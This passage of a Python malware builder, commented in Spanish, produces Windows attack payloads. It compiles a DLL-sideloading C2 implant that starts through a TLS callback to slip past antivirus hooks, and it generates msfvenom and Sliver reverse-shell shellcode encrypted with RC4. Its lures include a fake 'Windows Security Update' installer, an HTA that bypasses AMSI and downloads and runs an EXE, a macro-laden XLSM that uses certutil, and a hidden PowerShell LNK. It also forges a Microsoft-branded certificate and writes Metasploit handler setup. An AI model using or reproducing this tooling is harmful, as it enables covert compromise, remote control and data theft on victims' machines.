        else{{pkt_send(s,"\\r\\n",2);}}
    }}
    closesocket(s); WSACleanup(); return 0;
}}

/* ── Fake libcurl exports (GUP.exe espera estas funciones) ────────── */
__declspec(dllexport) int         curl_global_init(long f)         {{ (void)f; return 0; }}
__declspec(dllexport) void*       curl_easy_init()                  {{ return (void*)1; }}
__declspec(dllexport) int         curl_easy_setopt()                {{ return 0; }}
__declspec(dllexport) int         curl_easy_perform(void* h)        {{ (void)h; return 0; }}
__declspec(dllexport) void        curl_easy_cleanup(void* h)        {{ (void)h; }}
__declspec(dllexport) void        curl_global_cleanup()             {{}}
__declspec(dllexport) const char* curl_easy_strerror(int c)         {{ (void)c; return ""; }}
__declspec(dllexport) void*       curl_slist_append()               {{ return NULL; }}
__declspec(dllexport) void        curl_slist_free_all(void* l)      {{ (void)l; }}
__declspec(dllexport) int         curl_easy_getinfo()               {{ return 0; }}
__declspec(dllexport) const char* curl_version()                    {{ return "libcurl/7.88.1"; }}
__declspec(dllexport) int         curl_easy_reset(void* h)          {{ (void)h; return 0; }}
__declspec(dllexport) void*       curl_easy_duphandle(void* h)      {{ (void)h; return NULL; }}
__declspec(dllexport) void        curl_free(void* p)                {{ (void)p; }}

/* ── TLS callback — dispara ANTES de DllMain, antes de hooks de AV ─
 * Técnica extraída del análisis de FRIEND (libcurl.dll → gup_util.dll).
 * ntdll!LdrpCallTlsInitializers se ejecuta ANTES de LdrpCallInitRoutine
 * (que llama a DllMain). La mayoría de AV hookean DllMain — aquí ya
 * estamos corriendo. MinGW provee _tls_used/_tls_index vía tlssup.o;
 * solo necesitamos registrar el callback en .CRT$XLB.
 * ─────────────────────────────────────────────────────────────────── */
static void NTAPI _tls_cb(PVOID hDll, DWORD reason, PVOID reserved);

/* Registrar en .CRT$XLB — MinGW CRT lo incorpora al TLS callback array */
__attribute__((section(".CRT$XLB"), used))
static PIMAGE_TLS_CALLBACK _my_tls_ptr = _tls_cb;

static void NTAPI _tls_cb(PVOID hDll, DWORD reason, PVOID reserved) {{
    (void)hDll; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {{
        /* Payload lanzado antes de DllMain — antes de hooks de AV */
        HANDLE t = CreateThread(NULL, 0, _thread, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }}
}}

/* DllMain minimal — TLS callback ya lanzó el thread */
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lpv) {{
    (void)lpv;
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}}
"""
    # 1. Compilar DLL (custom C2 implant — protocolo XOR propio, sin meterpreter)
    #    - -lws2_32:   WinSock2 para la conexión
    #    - -ladvapi32: RegOpenKeyExA para sysinfo (OS name desde registry)
    #    - -O1: menos patrones para ML estático
    ruta_c = os.path.join(out_dir, "_mini.c")
    ruta_dll = os.path.join(out_dir, "libcurl.dll")
    with open(ruta_c, "w") as f: f.write(dll_c)
    gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        warn("mingw-w64 no encontrado"); os.remove(ruta_c); return None
    r = subprocess.run(["nice","-n","10", gcc, ruta_c, "-o", ruta_dll,
        "-shared", "-static-libgcc", "-O1", "-s",
        "-lws2_32", "-ladvapi32",
        "-Wl,--subsystem,windows", "-Wl,--kill-at"],
        capture_output=True)
    os.remove(ruta_c)
    if not os.path.exists(ruta_dll):
        if r.stderr: warn(r.stderr.decode(errors="ignore")[:400])
        return None

    # 2. Descargar GUP.exe x64
    gup_src = _descargar_gup_x64(carpeta)
    if not gup_src: return None
    shutil.copy2(gup_src, os.path.join(out_dir, "GUP.exe"))

    # 3. gup.xml
    xml_path = _crear_gup_xml(out_dir)

    # 4. Generar servidor Python C2 (para Kali — no va en el EXE)
    srv_path = _generar_c2_server(carpeta, lport, xk_hex)
    if srv_path:
        ok(f"Servidor C2: {os.path.basename(srv_path)} — corre con python3 en Kali")

    # 5. Packaging: 1 solo EXE para la víctima
    #    Prioridad: NSIS (stub trusted por AV, archivos LZMA-comprimidos ocultos)
    #    Fallback:  dropper casero (XOR-cifrado, menos stealth pero funcional)
    gup_in_dir = os.path.join(out_dir, "GUP.exe")
    dll_in_dir = os.path.join(out_dir, "libcurl.dll")

    dropper_path = _generar_nsis_wrapper(gup_in_dir, dll_in_dir, xml_path,
                                         carpeta, nombre_base)
    if dropper_path:
        sz = os.path.getsize(dropper_path) // 1024
        ok(f"NSIS installer: {nombre_base}.exe ({sz} KB) — stub NSIS trusted por AV")
    else:
        warn("NSIS fallo — usando dropper EXE como fallback...")
        dropper_path = _generar_dropper_exe(gup_in_dir, dll_in_dir, xml_path,
                                            carpeta, nombre_base)
        if dropper_path:
            sz = os.path.getsize(dropper_path) // 1024
            ok(f"Dropper EXE: {nombre_base}.exe ({sz} KB)")
        else:
            warn("Dropper tambien fallo — entrega manual: carpeta " + os.path.basename(out_dir))

    return out_dir, dropper_path

def _rc4(data, key):
    """RC4 encryption - keystream pseudoaleatorio, mucho mas dificil de detectar que XOR."""
    S=list(range(256)); j=0
    for i in range(256):
        j=(j+S[i]+key[i%len(key)])%256
        S[i],S[j]=S[j],S[i]
    i=j=0; out=bytearray(len(data))
    for idx,byte in enumerate(data):
        i=(i+1)%256; j=(j+S[i])%256
        S[i],S[j]=S[j],S[i]
        out[idx]=byte^S[(S[i]+S[j])%256]
    return bytes(out)

def _xor_y_compilar(sc_raw, carpeta, nombre_salida):
    key   =secrets.token_bytes(32)
    sc_enc=_rc4(sc_raw, key)          # RC4 en vez de XOR simple
    c_arr =lambda data: "{"+",".join(f"0x{b:02X}" for b in data)+"}"
    return _compilar_loader(_build_loader_c(c_arr(key),c_arr(sc_enc)),carpeta,nombre_salida)

# ──────────────────────────────────────────────────────────────────────────────
# SLIVER C2
# ──────────────────────────────────────────────────────────────────────────────

def _sliver_puerto_abierto(timeout=2):
    """Devuelve True si el server Sliver ya escucha en 127.0.0.1:31337."""
    import socket
    try:
        s=socket.create_connection(("127.0.0.1",31337),timeout=timeout)
        s.close(); return True
    except Exception: return False

def _sliver_find_binary(nombres):
    """
    Busca un binario de Sliver por nombre.
    Prioridad: PATH del proceso, directorios comunes, systemctl cat, sudo which, sudo find.
    """
    candidatos=[]
    for n in nombres:
        p=shutil.which(n)
        if p: candidatos.append(p)
    dirs=["/usr/local/bin","/usr/bin","/root","/opt/sliver","/usr/local/sbin","/usr/sbin"]
    for d in dirs:
        for n in nombres:
            p=os.path.join(d,n)
            if os.path.isfile(p) and os.access(p,os.X_OK): candidatos.append(p)
    try:
        r=subprocess.run(["systemctl","cat","sliver"],capture_output=True,text=True,timeout=5)
        for line in r.stdout.splitlines():
            if "ExecStart=" in line:
                ruta=line.split("=",1)[1].strip().split()[0]
                if os.path.isfile(ruta): candidatos.append(ruta)
                d=os.path.dirname(ruta)
                for n in nombres:
                    cp=os.path.join(d,n)
                    if os.path.isfile(cp) and os.access(cp,os.X_OK): candidatos.append(cp)
    except Exception: pass
    for n in nombres:
        try:
            r=subprocess.run(["sudo","which",n],capture_output=True,text=True,timeout=5)
            p=r.stdout.strip()
            if p and os.path.isfile(p): candidatos.append(p)
        except Exception: pass
    for n in nombres:
        try:
            r=subprocess.run(["sudo","find","/usr","/opt","/root",
                              "-maxdepth","4","-name",n,"-type","f"],
                             capture_output=True,text=True,timeout=10)
            for p in r.stdout.strip().splitlines():
                if p and os.path.isfile(p): candidatos.append(p)
        except Exception: pass
    vistos=set(); resultado=[]
    for p in candidatos:
        if p not in vistos and os.access(p,os.X_OK):
            vistos.add(p); resultado.append(p)
    return resultado[0] if resultado else None

def _arrancar_sliver_server():
    """Arranca el daemon Sliver via systemctl o binario directo."""
    if _sliver_puerto_abierto(): return
    subprocess.run(["sudo","systemctl","start","sliver"],capture_output=True)
    for _ in range(20):
        time.sleep(1)
        if _sliver_puerto_abierto(): return
    # Fallback: binario con subcomando daemon
    srv=_sliver_find_binary(["sliver","sliver-server"])
    if srv:
        subprocess.Popen(["sudo",srv,"daemon"],
                         stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        for _ in range(30):
            time.sleep(1)
            if _sliver_puerto_abierto(): return

def _sudo_cache_credentials():
    """Pre-cachea sudo para que no mezcle prompt con el spinner."""
    r=subprocess.run(["sudo","-n","true"],capture_output=True)
    if r.returncode==0: return
    print(f"\n  {Y}[sudo]{X}  Sliver necesita permisos de root.")
    print(f"  {D}      Password de Kali (una sola vez):{X}\n")
    subprocess.run(["sudo","-v"],timeout=120); print()

def _sliver_configs_existentes():
    """
    Devuelve lista de .cfg en ubicaciones standard donde sliver-client
    guarda configs de operador (generados automaticamente por el daemon).
    """
    dirs=[
        os.path.expanduser("~/.sliver-client/configs"),
        "/root/.sliver-client/configs",
        "/home/kali/.sliver-client/configs",
    ]
    cfgs=[]; seen=set()
    for d in dirs:
        # Acceso directo
        try:
            if os.path.isdir(d):
                for f in sorted(os.listdir(d)):
                    if f.endswith(".cfg"):
                        fp=os.path.join(d,f)
                        if fp not in seen: cfgs.append(fp); seen.add(fp)
                continue
        except PermissionError: pass
        # Via sudo ls (para /root/ cuando corremos como kali)
        try:
            r=subprocess.run(["sudo","ls",d],capture_output=True,text=True,timeout=5)
            if r.returncode==0:
                for f in sorted(r.stdout.strip().split()):
                    if f.endswith(".cfg"):
                        fp=os.path.join(d,f)
                        if fp not in seen: cfgs.append(fp); seen.add(fp)
        except Exception: pass
    return cfgs

def _sliver_scan_output(carpeta, antes):
    """
    Detecta archivo de shellcode nuevo en carpeta.
    Acepta .bin, .shellcode, sin extension, cualquier binario >4096 bytes.
    """
    for fname in os.listdir(carpeta):
        ruta=os.path.join(carpeta,fname)
        try: sz=os.path.getsize(ruta)
        except Exception: continue
        if (fname,sz) in antes: continue
        if sz<4096: continue
        ext=os.path.splitext(fname)[1].lower()
        if ext in (".bin",".shellcode","") or "_sliver" in fname.lower():
            try:
                with open(ruta,"rb") as f: head=f.read(4)
                if b'\x00' in head or head[:2]==b'MZ' or head[0]>=0x80:
                    return ruta
            except Exception: continue
    return None

def _generar_shellcode_sliver(lhost,lport,carpeta):
    """
    Genera shellcode Sliver para Windows x64 via sliver-client console.

    Problemas conocidos con enfoques naive:
      - 'sliver-client implant generate' NO existe: 'implant' gestiona sesiones activas
      - pipe con 'exit' al final: sliver procesa 'generate' (async) → 'exit' inmediato
        → se cierra antes de que el servidor termine de compilar → returncode -9
      - stdin cierra por EOF: console TUI (bubbletea) puede salir al detectar EOF

    Solucion: PTY + stdin abierto sin 'exit'
      - Asigna un pseudo-terminal para que bubbletea no salga por falta de TTY
      - Escribe el comando generate, NO cierra stdin
      - Drena output del pty en loop para evitar que el buffer del kernel se llene
      - Detecta el archivo en carpeta cada 5s
      - Cuando aparece, cierra stdin (senala EOF al console → sale limpio)
      - timeout_s=1200 (20 min) — Go compile tarda mas con poca RAM
    """
    import pty, select as sel
    cli=_sliver_find_binary(["sliver-client","sliver"])
    info(f"Sliver bin: {cli or 'NO ENCONTRADO'}")
    info(f"Puerto :31337: {'ABIERTO' if _sliver_puerto_abierto() else 'CERRADO'}")

    if not cli:
        warn("sliver-client no encontrado. Instala: curl -sSf https://sliver.sh/install | sudo bash")
        return None

    if not _sliver_puerto_abierto():
        info("Daemon no activo — arrancando...")
        _arrancar_sliver_server()
        if not _sliver_puerto_abierto():
            warn("No se pudo levantar :31337")
            return None
    info("Puerto :31337 confirmado")

    # Snapshot pre-generacion
    antes=set()
    for fn in os.listdir(carpeta):
        fp=os.path.join(carpeta,fn)
        try: antes.add((fn,os.path.getsize(fp)))
        except Exception: pass

    # Buscar configs para saber que HOME usar
    cfgs=_sliver_configs_existentes()
    info(f"Configs encontrados: {cfgs or 'ninguno'}")

    # Derivar HOME candidatos de los configs existentes
    # /home/kali/.sliver-client/configs/x.cfg  →  /home/kali
    home_candidatos=[]
    for cp in cfgs:
        h=os.path.dirname(os.path.dirname(os.path.dirname(cp)))
        if os.path.isdir(h) and h not in home_candidatos:
            home_candidatos.append(h)
    # Siempre incluir /root y home actual
    for h in ["/root", os.path.expanduser("~")]:
        if h not in home_candidatos: home_candidatos.append(h)

    # Comando a enviar al console — SIN 'exit', stdin se mantiene abierto
    # --skip-symbols: reduce ~50% tiempo y memoria de compilacion
    gen_cmd=(
        f"generate --mtls {lhost}:{lport} "
        f"--os windows --arch amd64 --format shellcode "
        f"--save {carpeta} --name _sliver_sc --skip-symbols\n"
    ).encode()

    def _pty_console(cmd_list, home_env, timeout_s=1200):
        """
        Lanza sliver-client console via PTY.
        - Espera 4s para que cargue el banner/TUI
        - Envia gen_cmd por el master del pty
        - Drena output cada 0.5s (evita bloqueo por buffer lleno)
        - Detecta archivo en carpeta cada 5s
        - Cierra master (EOF → console sale) cuando encuentra el archivo o timeout
        """
        env=os.environ.copy()
        env["HOME"]=home_env
        env["TERM"]="xterm-256color"
        env["COLUMNS"]="220"
        env["LINES"]="50"
        try:
            master_fd,slave_fd=pty.openpty()
            proc=subprocess.Popen(
                cmd_list,
                stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
                env=env, close_fds=True,
                preexec_fn=os.setsid  # nuevo grupo de proceso
            )
            os.close(slave_fd)
        except Exception as e:
            warn(f"pty launch error: {e}"); return None

        # Esperar que el console arrange y muestre banner
        time.sleep(4)

        # Verificar que el proceso sigue vivo antes de enviar comandos
        if proc.poll() is not None:
            warn(f"console salio antes de enviar cmd (rc={proc.returncode})")
            try: os.close(master_fd)
            except: pass
            return None

        # Enviar comando generate
        try:
            os.write(master_fd, gen_cmd)
        except Exception as e:
            warn(f"error escribiendo al pty: {e}")
            proc.kill(); proc.wait()
            try: os.close(master_fd)
            except: pass
            return None

        info(f"  Comando enviado. Compilando en server (puede tardar 5-20 min)...")

        start=time.time()
        last_file_check=0
        while True:
            elapsed=time.time()-start
            if elapsed>=timeout_s:
                warn(f"pty timeout {timeout_s}s — buscando archivo...")
                sc=_sliver_scan_output(carpeta,antes)
                try: os.close(master_fd)
                except: pass
                proc.kill(); proc.wait()
                return sc

            # Drenar output del pty (evita bloqueo del kernel por buffer lleno)
            try:
                rfds,_,_=sel.select([master_fd],[],[],0.5)
                if rfds:
                    os.read(master_fd,4096)
            except OSError:
                # master_fd cerrado — proceso termino
                pass
            except Exception:
                pass

            # Verificar archivo cada 5s
            now=time.time()
            if now-last_file_check>=5:
                last_file_check=now
                sc=_sliver_scan_output(carpeta,antes)
                if sc:
                    info(f"  Shellcode encontrado: {os.path.basename(sc)}")
                    try: os.close(master_fd)  # cierra stdin → console sale
                    except: pass
                    proc.wait(timeout=5)
                    return sc

            # Verificar si el proceso ya termino
            if proc.poll() is not None:
                try: os.close(master_fd)
                except: pass
                sc=_sliver_scan_output(carpeta,antes)
                if sc: return sc
                warn(f"console termino (rc={proc.returncode}) sin generar shellcode")
                return None

        return None  # unreachable

    # Intentar con cada HOME candidato
    for home_dir in home_candidatos:
        info(f"MA: console PTY keepalive (HOME={home_dir})...")
        sc=_pty_console([cli,"console"], home_dir)
        if sc: return sc

        info(f"MB: console PTY keepalive sudo (HOME={home_dir})...")
        sc=_pty_console(["sudo","-E",cli,"console"], home_dir)
        if sc: return sc

    warn("Todos los metodos fallaron.")
    warn(f"Corre manualmente en otra terminal:")
    warn(f"  {cli} console")
    warn(f"  Dentro del console escribe:")
    warn(f"    generate --mtls {lhost}:{lport} --os windows --arch amd64 --format shellcode --save {carpeta} --skip-symbols")
    warn(f"  Cuando termine, corre python3 generador.py de nuevo")
    warn(f"  (el script detecta el .bin automaticamente en la carpeta)")
    return None

def _generar_loader_shell_nc(lhost,lport,carpeta,nombre_salida):
    """Shell reverso custom: cmd.exe pipe via TCP, listener netcat.
    Sin Meterpreter = sin firmas conocidas. Rapido: ~20s total."""
    ruta_raw=os.path.join(carpeta,"_sc.bin")
    lhost_ip=_resolver_ip(lhost)
    subprocess.run(["msfvenom","-p","windows/x64/shell_reverse_tcp",
        f"LHOST={lhost_ip}",f"LPORT={lport}",
        "--platform","windows","-a","x64","-f","raw","-o",ruta_raw],
        capture_output=True)
    if not os.path.exists(ruta_raw): return False
    with open(ruta_raw,"rb") as f: sc_raw=f.read()
    os.remove(ruta_raw)
    return _xor_y_compilar(sc_raw,carpeta,nombre_salida)

def _generar_loader_custom(lhost,lport,carpeta,nombre_salida):
    ruta_raw=os.path.join(carpeta,"_sc.bin")
    lhost_ip=_resolver_ip(lhost)
    subprocess.run(["msfvenom","-p","windows/x64/meterpreter/reverse_https",
        f"LHOST={lhost_ip}",f"LPORT={lport}",
        "--platform","windows","-a","x64","-f","raw","-o",ruta_raw],
        capture_output=True)
    if not os.path.exists(ruta_raw): return False
    with open(ruta_raw,"rb") as f: sc_raw=f.read()
    os.remove(ruta_raw)
    return _xor_y_compilar(sc_raw,carpeta,nombre_salida)

def _generar_loader_sliver(lhost,lport,carpeta,nombre_salida):
    _sudo_cache_credentials()
    ruta_sc=con_spinner("Generando implant Sliver (Go compile, ~5-8 min)...",
                        _generar_shellcode_sliver,lhost,lport,carpeta)
    if not ruta_sc: warn("No se genero shellcode Sliver."); return False
    with open(ruta_sc,"rb") as f: sc_raw=f.read()
    os.remove(ruta_sc)
    return _xor_y_compilar(sc_raw,carpeta,nombre_salida)

# ──────────────────────────────────────────────────────────────────────────────
# FORMATO 2: MSI via NSIS
# ──────────────────────────────────────────────────────────────────────────────

def _generar_msi_nsis(exe_payload,carpeta,nombre_base):
    if not shutil.which("makensis"):
        subprocess.run(["sudo","apt-get","install","-y","-q","nsis"],capture_output=True)
    if not shutil.which("makensis"):
        warn("makensis no disponible: sudo apt install nsis -y"); return None
    nsi_path=os.path.join(carpeta,"_setup.nsi")
    out_path=os.path.join(carpeta,f"{nombre_base}.msi")
    nsi=f"""
!define PNAME "Windows Security Update"
!define PVER "KB5041001"
Name "${{PNAME}} ${{PVER}}"
OutFile "{out_path}"
SilentInstall silent
AutoCloseWindow true
ShowInstDetails nevershow
Section "Main"
  SetOutPath "$TEMP\\_wu_"
  File "{exe_payload}"
  ExecWait '"$TEMP\\_wu_\\{os.path.basename(exe_payload)}"'
  RMDir /r "$TEMP\\_wu_"
SectionEnd
"""
    with open(nsi_path,"w") as f: f.write(nsi)
    r=subprocess.run(["makensis","-V0",nsi_path],capture_output=True)
    os.remove(nsi_path)
    return out_path if os.path.exists(out_path) else None

# ──────────────────────────────────────────────────────────────────────────────
# FORMATO 3: HTA dropper (AMSI bypass + download + exec)
# ──────────────────────────────────────────────────────────────────────────────

def _generar_hta(url_exe,carpeta,nombre_base):
    out_path=os.path.join(carpeta,f"{nombre_base}.hta")
    # AMSI bypass via VBScript + ADODB download + run
    hta=(
        '<html>\n<head>\n'
        '<HTA:APPLICATION ID="wu" APPLICATIONNAME="Windows Update" '
        'BORDER="none" CAPTION="no" SHOWINTASKBAR="no" '
        'SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>\n'
        '<script language="VBScript">\n'
        'Private Declare PtrSafe Function VirtualProtect Lib "kernel32" '
        '(ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, '
        'ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long\n'
        'Private Declare PtrSafe Function GetProcAddress Lib "kernel32" '
        '(ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\n'
        'Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" '
        '(ByVal lpLibFileName As String) As LongPtr\n'
        'Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" '
        '(Destination As Any, Source As Any, ByVal Length As LongPtr)\n'
        '\nSub PatchAMSI()\n'
        '    On Error Resume Next\n'
        '    Dim lib As LongPtr\n'
        '    lib = LoadLibraryA("am" & "si.dll")\n'
        '    If lib = 0 Then Exit Sub\n'
        '    Dim addr As LongPtr\n'
        '    addr = GetProcAddress(lib, "Amsi" & "Scan" & "Buffer")\n'
        '    If addr = 0 Then Exit Sub\n'
        '    Dim oldProt As Long\n'
        '    VirtualProtect addr, 6, &H40, oldProt\n'
        '    Dim patch(5) As Byte\n'
        '    patch(0)=&HB8:patch(1)=&H57:patch(2)=&H0\n'
        '    patch(3)=&H7:patch(4)=&H80:patch(5)=&HC3\n'
        '    CopyMemory ByVal addr, patch(0), 6\n'
        '    VirtualProtect addr, 6, oldProt, oldProt\n'
        'End Sub\n'
        '\nSub Window_OnLoad()\n'
        '    PatchAMSI\n'
        '    Dim oXHR\n'
        '    Set oXHR = CreateObject("MSXML2.XMLHTTP")\n'
        f'    oXHR.Open "GET", "{url_exe}", False\n'
        '    oXHR.Send\n'
        '    Dim oStr\n'
        '    Set oStr = CreateObject("ADODB.Stream")\n'
        '    oStr.Type = 1 : oStr.Open\n'
        '    oStr.Write oXHR.responseBody\n'
        '    Dim tmp\n'
        '    tmp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\\wu.exe"\n'
        '    oStr.SaveToFile tmp, 2 : oStr.Close\n'
        '    CreateObject("WScript.Shell").Run """" & tmp & """", 0, False\n'
        '    window.close()\n'
        'End Sub\n'
        '</script>\n</head>\n<body></body>\n</html>\n'
    )
    with open(out_path,"w") as f: f.write(hta)
    return out_path

# ──────────────────────────────────────────────────────────────────────────────
# FORMATO 4: XLSM con macro VBA (descarga exe via XMLHTTP, AMSI bypass)
# ──────────────────────────────────────────────────────────────────────────────

def _generar_xlsm_vba(url_exe,carpeta,nombre_base):
    """
    XLSM con Excel 4.0 (XLM) macros — sin vbaProject.bin, sin OLE CFB.
    XLM usa formulas en <f> dentro de xl/macrosheets/sheet1.xml.
    Auto_Open definedName apunta a Macro1!$A$1 → ejecucion al abrir.
    Usa certutil para descargar (menos firmas AV que XMLHTTP en macro sheet).
    """
    import zipfile
    out_path=os.path.join(carpeta,f"{nombre_base}.xlsm")

    # XML-escape del URL (& → &amp;) — el resto no tiene chars especiales en URLs normales
    url_safe=url_exe.replace("&","&amp;")
    # Ruta de destino sin espacios, sin comillas → C:\Windows\Temp
    dest=r"C:\Windows\Temp\wu.exe"
    dest_safe=dest.replace("\\","\\\\")  # para string literal dentro de formula

    # Dos celdas: A1=EXEC(descarga) A2=EXEC(ejecuta) A3=HALT()
    # certutil: funciona sin PS, sin powershell.exe en firma
    formula_dl =(f'=EXEC("cmd /c certutil -urlcache -split -f {url_safe} {dest}")')
    formula_run=(f'=EXEC("cmd /c start /b {dest}")')
    formula_halt='=HALT()'

    ct=('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/xl/workbook.xml"'
        ' ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>'
        '<Override PartName="/xl/macrosheets/sheet1.xml"'
        ' ContentType="application/vnd.ms-excel.macrosheet+xml"/>'
        '</Types>')

    rels=('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
          '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          '<Relationship Id="rId1"'
          ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
          ' Target="xl/workbook.xml"/>'
          '</Relationships>')

    # Auto_Open definedName → ejecuta la macro al abrir sin dialogo
    wb=('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
        ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<sheets>'
        '<sheet name="Macro1" sheetId="1" state="hidden" r:id="rId1"/>'
        '</sheets>'
        '<definedNames>'
        '<definedName name="Auto_Open">Macro1!$A$1</definedName>'
        '</definedNames>'
        '</workbook>')

    # Relacion: macrosheet usa xlMacrosheet type (no worksheet)
    wb_rels=('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
             '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
             '<Relationship Id="rId1"'
             ' Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet"'
             ' Target="macrosheets/sheet1.xml"/>'
             '</Relationships>')

    # Macrosheet: formulas en <f>, NO en <v> — esta es la correccion critica
    ms=('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        '<sheetData>'
        f'<row r="1"><c r="A1"><f>{formula_dl}</f></c></row>'
        f'<row r="2"><c r="A2"><f>{formula_run}</f></c></row>'
        f'<row r="3"><c r="A3"><f>{formula_halt}</f></c></row>'
        '</sheetData>'
        '</worksheet>')

    with zipfile.ZipFile(out_path,"w",zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",ct)
        zf.writestr("_rels/.rels",rels)
        zf.writestr("xl/workbook.xml",wb)
        zf.writestr("xl/_rels/workbook.xml.rels",wb_rels)
        zf.writestr("xl/macrosheets/sheet1.xml",ms)

    return out_path if os.path.exists(out_path) else None

# ──────────────────────────────────────────────────────────────────────────────
# FORMATO 5: LNK (Windows Shortcut) — Python struct puro
# ──────────────────────────────────────────────────────────────────────────────

def _generar_lnk(url_exe,carpeta,nombre_base):
    """
    Genera .lnk (Shell Link Binary) en Python puro.
    Apunta a powershell.exe con argumento de download+exec silencioso.
    Casi 0 detecciones en AV — .lnk es binario opaco, pocos patrones de firma.
    """
    out_path=os.path.join(carpeta,f"{nombre_base}.lnk")

    target =r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    workdir=r"C:\Windows\System32"
    desc   ="Windows Security Health Service"
    rel    =r"..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    icon   =target
    args   =(f'-w hidden -ep bypass -nop -c "'
             f'$p=$env:TEMP+\'\\wu.exe\';'
             f'(New-Object Net.WebClient).DownloadFile(\'{url_exe}\',$p);'
             f'Start-Process $p -WindowStyle Hidden"')

    def u16(s): return struct.pack("<H",len(s))+s.encode("utf-16-le")

    # LinkFlags: HasLinkTargetIDList|HasLinkInfo|HasDescription|HasRelativePath|
    #            HasWorkingDir|HasArguments|HasIconLocation|IsUnicode
    LF    = 0x000001FF
    FA    = 0x00000020   # FILE_ATTRIBUTE_ARCHIVE
    SHOW  = 0x00000007   # SW_SHOWMINNOACTIVE
    CLSID = b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
    Z8    = b'\x00'*8

    hdr  = struct.pack("<I",76)+CLSID
    hdr += struct.pack("<I",LF)+struct.pack("<I",FA)
    hdr += Z8+Z8+Z8                         # creation/access/write timestamps
    hdr += struct.pack("<III",0,0,SHOW)      # FileSize, IconIndex, ShowCommand
    hdr += struct.pack("<H",0)+b'\x00'*10   # HotKey + reserved

    # LinkTargetIDList (minimal: just terminator)
    idl  = struct.pack("<H",0)
    idl_block = struct.pack("<H",len(idl))+idl

    # LinkInfo (minimal, 28 bytes, no volume info)
    li_size=28
    li = struct.pack("<IIIIIII",li_size,li_size,0,0,0,0,0)

    # StringData sections (each: uint16 count + utf-16-le chars, NO null terminator)
    sd_desc = u16(desc)
    sd_rel  = u16(rel)
    sd_work = u16(workdir)
    sd_args = u16(args)
    sd_icon = u16(icon)

    lnk = hdr+idl_block+li+sd_desc+sd_rel+sd_work+sd_args+sd_icon
    with open(out_path,"wb") as f: f.write(lnk)
    return out_path

# ──────────────────────────────────────────────────────────────────────────────
# DELIVERY
# ──────────────────────────────────────────────────────────────────────────────

def _generar_iso(ruta,carpeta,nombre_base):
    out=os.path.join(carpeta,f"{nombre_base}.iso")
    subprocess.run(["genisoimage","-o",out,"-J","-R","-V","WindowsUpdate","-quiet",ruta],capture_output=True)
    return out if os.path.exists(out) else None

def _generar_zip_password(ruta,carpeta,nombre_base,pwd=ZIP_PASSWORD):
    out=os.path.join(carpeta,f"{nombre_base}.zip")
    subprocess.run(["7z","a",f"-p{pwd}","-mhe=on",out,ruta],capture_output=True)
    return out if os.path.exists(out) else None

# ──────────────────────────────────────────────────────────────────────────────
# LISTENER / SERVIDOR / EMAIL
# ──────────────────────────────────────────────────────────────────────────────

def generar_cert_ssl():
    if os.path.exists(CERT_PATH): return CERT_PATH
    r=subprocess.run(["openssl","req","-new","-newkey","rsa:2048","-days","365",
        "-nodes","-x509","-subj",
        "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com",
        "-keyout",CERT_PATH,"-out",CERT_PATH],capture_output=True)
    return CERT_PATH if r.returncode==0 else None

def escribir_rc(lhost,lport,ruta):
    cert=generar_cert_ssl()
    cl=f"set HandlerSSLCert {cert}\n" if cert else ""
    with open(ruta,"w") as f:
        f.write(f"use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\n"
                f"set LHOST {lhost}\nset LPORT {lport}\nset ExitOnSession false\n"
                f"set EnableUnicodeEncoding true\nset EnableStageEncoding true\n"
                f"set StageEncoder x64/xor_dynamic\n{cl}exploit -j\n")

def abrir_metasploit(ruta_rc):
    cmd=f"msfconsole -r {ruta_rc}"
    for b,a in [("x-terminal-emulator",["-e",cmd]),("qterminal",["-e",cmd]),
                ("xterm",["-e",cmd]),("xfce4-terminal",["--command",f"bash -c '{cmd}; exec bash'"]),
                ("gnome-terminal",["--","bash","-c",f"{cmd}; exec bash"]),
                ("lxterminal",["-e",cmd]),("mate-terminal",["-e",cmd]),
                ("alacritty",["-e","bash","-c",cmd]),("kitty",["bash","-c",cmd])]:
        if shutil.which(b):
            try: subprocess.Popen([b]+a,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL); return b
            except: continue
    return None

def iniciar_servidor(carpeta, puerto, cert_path=None):
    import ssl
